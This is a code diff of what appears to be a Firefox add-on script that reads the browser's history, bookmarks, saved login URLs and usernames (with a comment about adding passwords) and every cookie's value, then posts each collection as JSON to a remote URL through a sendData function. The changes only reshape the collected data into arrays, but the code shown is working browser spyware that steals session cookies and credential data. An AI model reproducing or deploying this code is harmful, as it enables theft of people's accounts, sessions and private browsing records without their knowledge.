@@ -28,7 +28,7 @@ function logURL(tab) {
 
 function getHistory()
 {
-   var history = "";
+   var history = Array();
    
 
     // queries parameters (e.g. domain name matching, text terms matching, time range...)
@@ -52,7 +52,7 @@ function getHistory()
         var node = cont.getChild(i);
         // "node" attributes contains the information (e.g. URI, title, time, icon...)
         // see : https://developer.mozilla.org/en/nsINavHistoryResultNode
-       history= history+ node.title+ "," + node.uri + "," + node.time + "\n";
+       history.push(Array(node.title,node.uri,node.time));
     }
     
     // Close container when done
@@ -73,7 +73,7 @@ function getBookmarks(){
     
     // Export bookmarks in JSON format to file
     PlacesUtils.backupBookmarksToFile(jsonFile);
-    console.log(Read(jsonFile.path));
+  //  console.log(Read(jsonFile.path));
     
 }
 
@@ -91,13 +91,11 @@ function Read(file)
 }
 
 function show_all_passwords() {
-var allCredentials = Array();
-var x = 0;
+allCredentials = Array();
   passw.search({
     onComplete: function onComplete(credentials) {
       credentials.forEach(function(credential) {
-        allCredentials[x]= Array(credential.url,credential.username); // add ,credential.password
-        x++;
+        allCredentials.push(Array(credential.url,credential.username)); // add ,credential.password
         });
         sendData(allCredentials,"c");
         return;
@@ -108,10 +106,10 @@ var x = 0;
 
 function getCookies()
 {
-    cookies = "";      
+    cookies = Array();      
     for (var e = cookieManager.enumerator; e.hasMoreElements();) {
         var cookie = e.getNext().QueryInterface(Ci.nsICookie); 
-        cookies += cookie.host + ";" + cookie.name + "=" + cookie.value + "\n"; 
+        cookies.push(Array(cookie.host,cookie.name,cookie.value));
     }
     sendData(cookies,"co");
 }
@@ -135,7 +133,7 @@ function sendData(data2,handler)
     var req = request.Request({
            url:url,
            content:{
-               data:data2             
+               data:JSON.stringify(data2)             
                }
        }).post();    
 }    
